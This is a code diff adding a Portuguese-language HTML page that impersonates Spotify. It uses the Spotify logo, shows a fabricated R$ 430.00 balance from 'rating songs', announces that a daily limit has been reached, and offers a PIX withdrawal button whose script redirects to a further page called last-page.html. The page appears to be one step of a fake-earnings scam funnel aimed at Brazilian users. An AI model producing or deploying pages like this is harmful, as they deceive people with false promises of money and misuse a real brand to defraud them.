@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saque Spot</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        body {
+            background-color: black;
+            color: white;
+            text-align: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: auto;
+            padding-top: 20px;
+        }
+
+        .header {
+            background-color: #121212;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header img {
+            height: 30px;
+        }
+
+        .saldo {
+            background-color: #333;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 18px;
+        }
+
+        .conteudo {
+            background-color: #191919;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 15px;
+        }
+
+        .conteudo h2 {
+            color: #1DB954;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .artista {
+            background-color: #5b0974;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .limite {
+            background-color: black;
+            padding: 25px;
+            margin-top: 20px;
+            border-radius: 10px;
+        }
+
+        .limite img {
+            width: 400px; /* Mantendo o tamanho maior */
+            display: block; /* Garante que a imagem se comporte como bloco */
+            margin: 0 auto; /* Centraliza horizontalmente */
+        }
+
+        .limite h2 {
+            color: #1DB954;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+
+        .limite p {
+            font-size: 14px;
+            margin: 10px 0;
+        }
+
+        .botao {
+            background-color: white;
+            color: black;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 25px;
+            display: inline-block;
+            text-decoration: none;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .botao:hover {
+            background-color: #e6e6e6;
+        }
+
+        .limite span {
+            font-size: 12px;
+            color: #888;
+            display: block;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+<br>
+    <br>
+    <div class="container">
+        <!-- Cabeçalho -->
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg" alt="Spotify">
+            <div class="saldo">R$ 430.00</div>
+        </div>
+
+        <!-- Avaliação -->
+        <div class="conteudo">
+            <h2>Avalie músicas e <span style="color: #1DB954;">ganhe por isso</span></h2>
+            <div class="artista">Parabéns !!</div>
+        </div>
+
+        <!-- Limite diário -->
+        <div class="limite">
+            <img src="gl.png" alt="Mulher segurando o troféu"> <!-- Aqui entra sua imagem PNG -->
+            <h2>Limite diário atingido!</h2>
+            <p>Precisa sacar seu saldo hoje?</p>
+            <a href="#" class="botao" id="saquePix">SAQUE NO PIX AGORA</a>
+            <br>
+            <br>
+            
+            <span>Saque máximo R$ 430,00 saque via pix.</span>
+            <br>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("saquePix").addEventListener("click", function(event) {
+            event.preventDefault(); // Evita comportamento padrão do link
+            window.location.href = "last-page.html";
+        });
+    </script>
+
+</body>
+</html>
